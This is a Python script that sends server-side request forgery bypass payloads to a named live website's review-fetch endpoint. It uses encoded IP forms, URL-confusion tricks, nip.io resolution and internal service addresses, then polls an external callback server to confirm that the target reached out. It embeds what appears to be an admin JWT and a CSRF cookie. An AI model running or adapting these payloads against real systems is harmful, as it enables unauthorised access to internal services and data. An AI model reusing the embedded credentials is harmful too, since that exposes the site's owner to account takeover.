"""
Advanced SSRF Bypass Payloads for quangtx.io.vn
Testing various bypass techniques to reach callback server
"""
import requests
import time
import json

TARGET_URL = "https://quangtx.io.vn/api/products/5/fetch_review/"
CALLBACK_URL = "http://40.82.145.240:8888"
TOKEN = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQURNSU4iLCJzdWIiOiJhZG1pbiIsImlhdCI6MTc2NTk0OTgxMSwiZXhwIjoxNzY2MDM2MjExfQ.P_6YkmyrdPEhkvOn4LkxmR6MaNb3s9pOw7GQCHrUUL8"

headers = {
    'Token': f'token={TOKEN}',
    'Content-Type': 'application/json',
    'Cookie': 'csrftoken=ewyxpUtTxvZYXTHqjGpbu8zV7AFDHaEc'
}

# Bypass payloads
test_payloads = [
    {
        "name": "Direct IP",
        "payload": f"{CALLBACK_URL}/ssrf-direct",
        "description": "Direct IP address"
    },
    {
        "name": "IP Decimal",
        "payload": f"http://682862704:8888/ssrf-decimal",  # 40.82.145.240 in decimal
        "description": "IP in decimal format"
    },
    {
        "name": "IP Octal",
        "payload": f"http://0050.0122.0221.0360:8888/ssrf-octal",  # 40.82.145.240 in octal
        "description": "IP in octal format"
    },
    {
        "name": "IP Hex",
        "payload": f"http://0x28.0x52.0x91.0xf0:8888/ssrf-hex",  # 40.82.145.240 in hex
        "description": "IP in hex format"
    },
    {
        "name": "URL with @",
        "payload": f"http://user-service:8081@40.82.145.240:8888/ssrf-at",
        "description": "Fake internal service with @ redirect"
    },
    {
        "name": "URL with #",
        "payload": f"http://40.82.145.240:8888/ssrf-hash#user-service:8081",
        "description": "External URL with internal fragment"
    },
    {
        "name": "DNS Rebinding (nip.io)",
        "payload": f"http://40.82.145.240.nip.io:8888/ssrf-rebind",
        "description": "Using nip.io for DNS resolution"
    },
    {
        "name": "Localhost redirect",
        "payload": f"http://localhost:8888/ssrf-localhost",
        "description": "Test if localhost allowed"
    },
    {
        "name": "127.0.0.1 redirect",
        "payload": f"http://127.0.0.1:8888/ssrf-127",
        "description": "Test if 127.0.0.1 allowed"
    },
    {
        "name": "Internal service",
        "payload": f"http://user-service:8081/api/users/1",
        "description": "Known working internal service (control test)"
    }
]

print("=" * 80)
print("🎯 SSRF Bypass Testing for quangtx.io.vn")
print("=" * 80)
print(f"Target: {TARGET_URL}")
print(f"Callback Server: {CALLBACK_URL}")
print(f"Total payloads: {len(test_payloads)}\n")

results = []

for i, test in enumerate(test_payloads, 1):
    print(f"\n[{i}/{len(test_payloads)}] Testing: {test['name']}")
    print(f"   Description: {test['description']}")
    print(f"   Payload: {test['payload']}")
    
    try:
        payload = {"review_url": test['payload']}
        response = requests.post(TARGET_URL, json=payload, headers=headers, timeout=10)
        
        print(f"   ✅ Status: {response.status_code}")
        
        # Parse response
        try:
            data = response.json()
            status_code = data.get('status_code', 'N/A')
            summary = data.get('summary', '')
            content_preview = data.get('content_preview', '')[:100]
            
            print(f"   📊 Target response code: {status_code}")
            print(f"   📝 Summary: {summary}")
            
            # Check if target actually fetched the URL
            if status_code == 200:
                print(f"   ✅ TARGET FETCHED THE URL!")
                if 'id' in content_preview or 'username' in content_preview:
                    print(f"   🎯 Got user data - likely internal service")
                elif 'callback' in content_preview.lower() or 'ssrf' in content_preview.lower():
                    print(f"   🚨 CALLBACK SERVER REACHED! VULNERABLE!")
            elif status_code in [0, None, 'N/A']:
                print(f"   ⚠️ Target couldn't reach URL (network error/timeout)")
            else:
                print(f"   ℹ️ Target got HTTP {status_code}")
                
            results.append({
                'test': test['name'],
                'payload': test['payload'],
                'success': status_code == 200,
                'status_code': status_code,
                'response_preview': content_preview
            })
                
        except json.JSONDecodeError:
            print(f"   ⚠️ Non-JSON response: {response.text[:100]}")
            
    except requests.exceptions.Timeout:
        print(f"   ⏱️ Request timeout")
        results.append({'test': test['name'], 'payload': test['payload'], 'success': False, 'error': 'timeout'})
    except Exception as e:
        print(f"   ❌ Error: {str(e)[:100]}")
        results.append({'test': test['name'], 'payload': test['payload'], 'success': False, 'error': str(e)[:100]})
    
    time.sleep(1)  # Rate limiting

# Check callback server for any hits
print("\n" + "=" * 80)
print("📞 Checking Callback Server for Incoming Requests")
print("=" * 80)

try:
    response = requests.get(f"{CALLBACK_URL}/api/callbacks/public?limit=50", timeout=5)
    if response.status_code == 200:
        data = response.json()
        callbacks = data.get('callbacks', [])
        
        # Filter for our test callbacks (last 5 minutes)
        recent_callbacks = [cb for cb in callbacks if 'ssrf-' in cb.get('path', '')]
        
        if recent_callbacks:
            print(f"\n🎉 Found {len(recent_callbacks)} test callback(s)!")
            for cb in recent_callbacks[:5]:
                print(f"\n  ✅ {cb.get('path')}")
                print(f"     Time: {cb.get('timestamp')}")
                print(f"     Source IP: {cb.get('source_ip')}")
                print(f"     User-Agent: {cb.get('user_agent', '')[:50]}")
        else:
            print("\n❌ No test callbacks found")
            print(f"📊 Total callbacks in server: {len(callbacks)}")
            if callbacks:
                print(f"\nLatest callback:")
                print(f"  Path: {callbacks[0].get('path')}")
                print(f"  Time: {callbacks[0].get('timestamp')}")
except Exception as e:
    print(f"❌ Failed to check callbacks: {e}")

# Summary
print("\n" + "=" * 80)
print("📊 Test Summary")
print("=" * 80)

successful_tests = [r for r in results if r.get('success')]
print(f"\nSuccessful fetches: {len(successful_tests)}/{len(results)}")

if successful_tests:
    print("\n✅ URLs that target successfully fetched:")
    for r in successful_tests:
        print(f"  • {r['test']}: {r['payload']}")
        
print("\n💡 Analysis:")
print("  • If only 'Internal service' works: Target has URL whitelist/validation")
print("  • If no external URLs work: Outbound connections blocked by firewall")
print("  • If bypass payloads work: SSRF vulnerability confirmed!")
print("\n" + "=" * 80)
